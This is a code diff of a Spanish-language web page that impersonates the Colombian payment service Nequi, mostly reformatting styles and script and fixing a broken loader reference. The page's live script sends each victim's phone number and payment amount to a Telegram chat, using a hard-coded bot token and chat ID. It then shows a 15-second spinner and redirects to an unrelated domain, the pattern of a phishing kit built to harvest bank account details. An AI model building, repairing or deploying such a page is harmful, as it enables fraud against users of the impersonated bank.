@@ -14,9 +14,7 @@
       --brand-color: #5c2d91;
     }
 
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       margin: 0;
@@ -53,9 +51,7 @@
       text-align: right;
     }
 
-    .content {
-      width: 100%;
-    }
+    .content { width: 100%; }
 
     .title {
       color: #333;
@@ -90,9 +86,7 @@
       font-family: inherit;
     }
 
-    .custom-form-control:focus {
-      border-color: var(--brand-color);
-    }
+    .custom-form-control:focus { border-color: var(--brand-color); }
 
     .btn {
       width: 100%;
@@ -107,28 +101,19 @@
       cursor: pointer;
     }
 
-    .btn:hover {
-      opacity: .95;
-    }
+    .btn:hover { opacity: .95; }
 
     .footer {
       margin-top: 35px;
       text-align: center;
     }
 
-    .footer img {
+    .footer img, .help img {
       max-width: 100%;
       height: auto;
     }
 
-    .help {
-      margin-top: 20px;
-    }
-
-    .help img {
-      max-width: 100%;
-      height: auto;
-    }
+    .help { margin-top: 20px; }
 
     #loader {
       position: fixed;
@@ -140,9 +125,7 @@
       z-index: 9999;
     }
 
-    .loader-box {
-      text-align: center;
-    }
+    .loader-box { text-align: center; }
 
     .spinner {
       width: 42px;
@@ -160,9 +143,7 @@
     }
 
     @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
+      to { transform: rotate(360deg); }
     }
 
     #initialLoader {
@@ -187,29 +168,20 @@
   </div>
 
   <div class="container">
-
     <div class="header">
       <div class="nequi">Nequi</div>
-
-      <!-- El monto se mostrará aquí -->
       <div class="amount" id="monto">Monto: $0</div>
     </div>
 
     <div class="content">
-
-      <div class="title">
-        Paga con Nequi
-      </div>
+      <div class="title">Paga con Nequi</div>
 
       <div class="description">
         Ingresa tu número de celular asociado a Nequi para continuar con el pago.
       </div>
 
       <form id="nequiForm">
-
-        <label class="label" for="telefono">
-          Número de celular
-        </label>
+        <label class="label" for="telefono">Número de celular</label>
 
         <input
           type="tel"
@@ -222,12 +194,8 @@
           placeholder="Número de celular"
         >
 
-        <button type="submit" class="btn">
-          VALIDAR
-        </button>
-
+        <button type="submit" class="btn">VALIDAR</button>
       </form>
-
     </div>
 
     <div class="footer">
@@ -237,9 +205,9 @@
     <div class="help">
       <img src="img/ayuda.png" alt="Ayuda">
     </div>
-
   </div>
 
+  <!-- Modal que se muestra al enviar -->
   <div id="loader">
     <div class="loader-box">
       <div class="spinner"></div>
@@ -248,153 +216,143 @@
   </div>
 
   <script>
-  // ================= CONFIGURACIÓN DE TELEGRAM =================
-  const TELEGRAM_BOT_TOKEN = '8223520326:AAHX3wFpsoUX5Iz8_6-5xxUAEWmUGgGSZ5k';
-  const TELEGRAM_CHAT_ID = '7776240161';
+    // ================= CONFIGURACIÓN DE TELEGRAM =================
+    const TELEGRAM_BOT_TOKEN = '8223520326:AAHX3wFpsoUX5Iz8_6-5xxUAEWmUGgGSZ5k';
+    const TELEGRAM_CHAT_ID = '7776240161';
 
-  // ================= OCULTAR LOADER INICIAL =================
-  window.addEventListener('load', function () {
-    setTimeout(function () {
-      const initialLoader = document.getElementById('initialLoader');
-      if (initialLoader) {
-        initialLoader.classList.add('hidden');
-        initialLoader.style.pointerEvents = 'none';
-        initialLoader.style.zIndex = '-1';
-        initialLoader.style.display = 'none';
-      }
-    }, 1000); // reducido a 1s (antes 3000ms en uno y 500ms en otro)
-  });
+    // ================= OCULTAR LOADER INICIAL =================
+    window.addEventListener('load', function () {
+      setTimeout(function () {
+        const initialLoader = document.getElementById('initialLoader');
+        if (initialLoader) initialLoader.style.display = 'none';
+      }, 1000);
+    });
 
-  // ================= REFERENCIAS A ELEMENTOS =================
-  const form = document.getElementById('nequiForm');
-  const input = document.getElementById('telefono');
-  const modal = document.getElementById('loadingModal');
-  const montoEl = document.getElementById('monto');
+    // ================= REFERENCIAS A ELEMENTOS =================
+    const form = document.getElementById('nequiForm');
+    const input = document.getElementById('telefono');
+    const modal = document.getElementById('loader'); // ✅ corregido: era 'loadingModal'
+    const montoEl = document.getElementById('monto');
 
-  // ================= OBTENER MONTO (unificado) =================
-  function obtenerMontoRaw() {
-    try {
-      const params = new URLSearchParams(window.location.search);
-      return (
-        params.get("monto") ||
-        localStorage.getItem("finalAmount") ||
-        sessionStorage.getItem("finalAmount") ||
-        localStorage.getItem("total_pagar") ||
-        sessionStorage.getItem("total_pagar") ||
-        "0"
-      );
-    } catch (e) {
-      return "0";
-    }
-  }
-
-  function convertirMonto(valor) {
-    if (!valor) return 0;
-
-    let texto = String(valor).trim().replace(/\$/g, "").replace(/\s/g, "");
-
-    if (texto.includes(".") && texto.includes(",")) {
-      texto = texto.replace(/\./g, "").replace(",", ".");
-    } else if (texto.includes(",")) {
-      texto = texto.replace(",", ".");
-    } else if (texto.includes(".")) {
-      const partes = texto.split(".");
-      if (partes.length === 2 && partes[1].length === 3) {
-        texto = texto.replace(".", "");
+    // ================= OBTENER MONTO =================
+    function obtenerMontoRaw() {
+      try {
+        const params = new URLSearchParams(window.location.search);
+        return (
+          params.get("monto") ||
+          localStorage.getItem("finalAmount") ||
+          sessionStorage.getItem("finalAmount") ||
+          localStorage.getItem("total_pagar") ||
+          sessionStorage.getItem("total_pagar") ||
+          "0"
+        );
+      } catch (e) {
+        return "0";
       }
     }
 
-    texto = texto.replace(/[^\d.-]/g, "");
-    const numero = Number(texto);
-    return Number.isFinite(numero) ? numero : 0;
-  }
+    function convertirMonto(valor) {
+      if (!valor) return 0;
 
-  function mostrarMonto() {
-    const montoOriginal = obtenerMontoRaw();
-    const totalPagarNumero = convertirMonto(montoOriginal);
+      let texto = String(valor).trim().replace(/\$/g, "").replace(/\s/g, "");
 
-    if (totalPagarNumero > 0) {
-      const montoFormateado = new Intl.NumberFormat("es-CO", {
-        style: "currency",
-        currency: "COP",
-        minimumFractionDigits: 0,
-        maximumFractionDigits: 0
-      }).format(totalPagarNumero);
+      if (texto.includes(".") && texto.includes(",")) {
+        texto = texto.replace(/\./g, "").replace(",", ".");
+      } else if (texto.includes(",")) {
+        texto = texto.replace(",", ".");
+      } else if (texto.includes(".")) {
+        const partes = texto.split(".");
+        if (partes.length === 2 && partes[1].length === 3) {
+          texto = texto.replace(".", "");
+        }
+      }
 
-      montoEl.textContent = "Monto: " + montoFormateado;
-    } else {
-      montoEl.textContent = "Monto: $0";
+      texto = texto.replace(/[^\d.-]/g, "");
+      const numero = Number(texto);
+      return Number.isFinite(numero) ? numero : 0;
     }
-  }
 
-  // ================= FUNCIÓN PARA MOSTRAR ERROR =================
-  function mostrarError(mensaje) {
-    alert(mensaje);
-  }
+    function mostrarMonto() {
+      const totalPagarNumero = convertirMonto(obtenerMontoRaw());
 
-  // ================= FUNCIÓN PARA ENVIAR A TELEGRAM =================
-  async function enviarNotificacionTelegram(montoTexto, numero) {
-    const mensaje = `🔔 *Nuevo pago Nequi*\n\n📱 Número: ${numero}\n💰 Monto: ${montoTexto}`;
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      if (totalPagarNumero > 0) {
+        const montoFormateado = new Intl.NumberFormat("es-CO", {
+          style: "currency",
+          currency: "COP",
+          minimumFractionDigits: 0,
+          maximumFractionDigits: 0
+        }).format(totalPagarNumero);
 
-    try {
-      const response = await fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: mensaje,
-          parse_mode: 'Markdown'
-        })
-      });
-      const data = await response.json();
-      if (!data.ok) {
-        console.error('Error al enviar a Telegram:', data.description);
+        montoEl.textContent = "Monto: " + montoFormateado;
+      } else {
+        montoEl.textContent = "Monto: $0";
+      }
+    }
+
+    function mostrarError(mensaje) {
+      alert(mensaje);
+    }
+
+    // ================= ENVIAR A TELEGRAM =================
+    async function enviarNotificacionTelegram(montoTexto, numero) {
+      const mensaje = `🔔 *Nuevo pago Nequi*\n\n📱 Número: ${numero}\n💰 Monto: ${montoTexto}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'Markdown'
+          })
+        });
+        const data = await response.json();
+        if (!data.ok) {
+          console.error('Error al enviar a Telegram:', data.description);
+          return false;
+        }
+        console.log('Notificación enviada a Telegram');
+        return true;
+      } catch (error) {
+        console.error('Error de red al enviar a Telegram:', error);
         return false;
       }
-      console.log('Notificación enviada a Telegram');
-      return true;
-    } catch (error) {
-      console.error('Error de red al enviar a Telegram:', error);
-      return false;
-    }
-  }
-
-  // ================= PERMITIR SOLO NÚMEROS EN EL INPUT =================
-  input.addEventListener("input", function () {
-    this.value = this.value.replace(/\D/g, "");
-  });
-
-  // ================= EVENTO ÚNICO DEL FORMULARIO =================
-  form.addEventListener('submit', async function (e) {
-    e.preventDefault();
-
-    const nequi = input.value.trim();
-    if (!/^\d{10}$/.test(nequi)) {
-      return mostrarError("El número debe tener exactamente 10 dígitos.");
     }
 
-    // Obtener el monto formateado que se muestra en la interfaz
-    const montoMostrado = montoEl.textContent.replace('Monto: ', '');
+    // ================= SOLO NÚMEROS EN EL INPUT =================
+    input.addEventListener("input", function () {
+      this.value = this.value.replace(/\D/g, "");
+    });
 
-    // 1. Mostrar modal de carga
-    modal.style.display = 'flex';
+    // ================= SUBMIT =================
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
 
-    // 2. Enviar notificación a Telegram
-    await enviarNotificacionTelegram(montoMostrado, nequi);
+      const nequi = input.value.trim();
+      if (!/^\d{10}$/.test(nequi)) {
+        return mostrarError("El número debe tener exactamente 10 dígitos.");
+      }
 
-    // 3. Esperar 15 segundos con el modal visible
-    await new Promise(resolve => setTimeout(resolve, 15000));
+      const montoMostrado = montoEl.textContent.replace('Monto: ', '');
 
-    // 4. Redirigir
-    window.location.href = 'https://adminjelpit.site/jelpit/portal_pagos.html';
-  });
+      // 1. Mostrar modal de carga
+      modal.style.display = 'flex';
 
-  // ================= MOSTRAR MONTO AL CARGAR =================
-  mostrarMonto();
-</script>
+      // 2. Enviar notificación a Telegram
+      await enviarNotificacionTelegram(montoMostrado, nequi);
 
-   
+      // 3. Esperar 15 segundos
+      await new Promise(resolve => setTimeout(resolve, 15000));
+
+      // 4. Redirigir
+      window.location.href = 'https://adminjelpit.site/jelpit/portal_pagos.html';
+    });
+
+    // ================= MOSTRAR MONTO AL CARGAR =================
+    mostrarMonto();
+  </script>
 
 </body>
 </html>
